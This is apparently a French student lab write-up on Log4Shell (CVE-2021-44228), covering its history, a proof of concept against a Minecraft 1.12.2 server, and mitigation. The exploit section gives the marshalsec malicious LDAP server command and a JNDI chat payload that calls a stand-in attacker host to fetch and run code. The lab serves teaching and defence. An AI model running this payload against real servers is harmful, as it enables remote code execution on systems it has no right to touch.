# veille_minecraft_log4shell

Dans ce cours il nous est demandé de mettre en place un LAB et d'exploiter une CVE de niveau 7 minimum puis de trouver un moyen de mitigation de la faille.
Notre groupe a donc choisi la CVE Log4shell de criticité de niveau 10. Ce niveau de criticité a été établit par le Common Vulnerability Scoring System (CVSS). 

## Historique de la vulnérabilité

Log4shell est une vulnérabilité basée sur la librairie java intitulée "Log4j" que l'on retrouve dans de nombreuses application permettant la gestion des logs.
Cette vulnérabilité a tout d'abord été signalée de manière privée à Apache le 24 novembre 2021.
Le 9 décembre 2021, Log4Shell a été publiquement divulgué et a reçu un correctif initial avec la version 2.15.0 d’Apache Log4j.


## Fonctionnement
Log4Shell est une vulnérabilité d’injection Java Naming and Directory Interface (JNDI), et qui peut permettre l'exécution de code à distance (RCE).
Le principe est simple, sur un système affecté un attaquant peu exécuter du code malveillant et récupérer des informations ou faire en sorte que le code exécuté fasse ce que l'attaquant veut qu'il fasse.

## Exploit

Nous allons donc détailler les étapes afin de reproduire une preuve de concept dans un environnement Minecraft.

Tout d'abord nous avons besoin :

- Java Development Kit (JDK) 8
- Serveur Minecraft de version 1.12.2
- Outil d'écoute LDAP

**I- On commence par configurer le serveur Minecraft :**

On télécharge la v.1.12.2 du serveur puis il faut accepter l'accord de la licence en modifiant le fichier nommé 'eula.txt' et en définissant 'eula=true'.
Ensuite on lance le serveur en exécutant `java -jar minecraft_serveur.1.12.2.jar`. 

**II- Préparer le serveur LDAP malveillant :**

On clone le dépôt git suivant : [marshalsec](https://github.com/mbechler/marshalsec)

- la commande suivante est utilisée pour clone un repo : `git clone https://github.com/mbechler/marshalsec`

On compile le projet :

cd marshalsec
     mvn clean package -DskipTests
     
   - Hébergez votre charge utile Java sur un serveur web accessible publiquement.
   - Lancez le serveur LDAP en spécifiant l'URL de votre charge utile :
     
     java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://votre-serveur.com/#Exploit
     

**III- Exploiter la vulnérabilité :**
   - Dans le client Minecraft, connectez-vous au serveur vulnérable.
   - Dans le chat du jeu, envoyez la charge utile suivante :
     
     ${jndi:ldap://votre-serveur.com:1389/Exploit}

   - Si l'exploitation est réussie, le code malveillant hébergé sera exécuté sur le serveur Minecraft.
## Mitigation 

Pour protéger votre serveur contre cette vulnérabilité, mettez à jour la bibliothèque Log4j vers la version 2.16.0 ou supérieure. Si une mise à jour immédiate n'est pas possible, ajoutez l'option suivante aux paramètres JVM lors du démarrage du serveur :

- `Dlog4j2.formatMsgNoLookups=true`

## Bilan

Nous avons pu voir au cours de la réalisation de ce TP que la CVE-2021-44228 appelé log4shell est très puissante et de ce fait très dangereuse. A l'appuie de ces propos nous avons le score de la 
CVE qui est égal à 10 soit le score le plus élevé sur les normes CVSS. 

## Sources utilisées 

https://www.trendmicro.com/fr_fr/what-is/apache-log4j-vulnerability.html
https://github.com/Justin-Garey/Minecraft-Log4j-Exploit
https://medium.com/@hackingvarangian/log4shell-vulnerability-part-1-minecraft-poc-ef770e5800de
